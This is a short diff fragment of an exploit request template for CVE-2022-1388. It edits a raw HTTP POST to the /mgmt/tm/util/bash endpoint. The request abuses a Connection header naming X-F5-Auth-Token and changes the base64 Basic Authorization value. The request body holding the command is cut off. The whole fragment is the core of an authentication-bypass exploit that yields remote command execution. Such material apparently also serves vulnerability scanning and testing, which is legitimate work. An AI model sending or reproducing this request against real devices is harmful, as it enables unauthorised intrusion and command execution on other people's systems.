@@ -16,7 +16,7 @@ CVE-2022-1388
 POST /mgmt/tm/util/bash HTTP/1.1
 Host: 
 Connection: keep-alive, X-F5-Auth-Token
-Authorization: Basic YWRtaW46
+Authorization: Basic YWRtaW46QVNhc1M=
 Content-Length: 45
 
 {
